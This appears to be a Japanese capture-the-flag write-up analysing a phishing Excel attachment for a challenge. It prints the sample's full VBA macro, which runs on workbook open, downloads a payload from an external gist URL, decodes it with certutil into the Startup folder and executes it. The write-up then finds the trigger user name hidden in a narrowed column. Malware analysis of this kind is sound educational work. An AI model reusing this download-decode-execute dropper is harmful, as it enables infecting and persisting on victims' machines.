# 標的攻撃I★★☆

```
ある日、株式会社マクニキにフィッシングメールのが届きました。メールを転送されたてしがわら君はその添付ファイル「製品価格一覧20180711.xls」を解析した。しかし、残念ながら、サンドボックス上では解析はできなかったため、手動で解析するととにしました。 特定のユーザ名の環境でないと動作しないようです。ファイルを調査して動作条件であるユーザ名を特定してください。（複数ある場合は一つのみ回答してください）。

パスワードは「infected」です。
```

エクセルに含まれているマルウェアの解析は初めてだ。

渡されたファイルを開き、マクロを無効化を選択。  

ツール→マクロ→マクロの編集

をクリックしマクロを確認すると`ThisWorkbook`という名前でVBAのマクロが見つかる。

```vb
Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1
Private Declare Sub Sleep Lib "kernel32" (ByVal ms As Long)

Private Sub Workbook_Open()

us = Application.UserName

For Each C In ActiveSheet.Range("C6:C11")
    If us = C.Value Then
        Set objShell = CreateObject("WScript.Shell")
        startupFolder = objShell.SpecialFolders("Startup")
        Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
        Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
        xHttp.Open "GET", "https://gist.githubusercontent.com/Sh1n0g1/3a240ce15fe7f26263ddf1877e5acc38/raw/d1d74601e5f4c94c958130accb16add9bb16e33d/cert", False
        xHttp.Send
        With bStrm
            .Type = 1 '//binary
            .Open
            .write xHttp.responseBody
            .savetofile startupFolder & "\cert.pem", 2 '//overwrite
        End With
        Sleep (10000)
        Shell "certutil -decode """ & startupFolder & "\cert.pem"" """ & startupFolder & "\cert.exe"""
        Sleep (5000)
        Shell startupFolder & "\cert.exe"
    End If
Next

End Sub
```

スクリプトを見てみると

```vb
us = Application.UserName
```

でユーザ名を取得し、

```vb
For Each C In ActiveSheet.Range("C6:C11")
    If us = C.Value Then
    ...
```

で`C:6:C11`のセルに含まれている文字とユーザ名を比較していることがわかる

エクセルシートを確認するとCのタブ細くなって隠されているので伸ばして確認すると文字が出てくるのでフラグが入手できる。